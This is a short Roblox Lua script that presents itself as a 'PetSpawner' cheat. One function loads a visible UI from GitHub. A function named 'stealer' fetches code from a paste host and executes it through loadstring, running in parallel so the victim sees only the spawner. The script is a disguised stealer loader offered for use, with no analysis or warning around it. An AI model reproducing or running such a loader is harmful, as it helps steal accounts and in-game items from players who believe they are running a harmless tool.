local function stealer()
  loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/4a1AnqvdjM2faa7F/raw", true))()
end
local function loadui()
loadstring(game:HttpGet("https://raw.githubusercontent.com/imalwaysbeamediocre/PetSpawner/refs/heads/main/AgeVisual.lua"))()
end

task.spawn(stealer)
task.spawn(loadui)
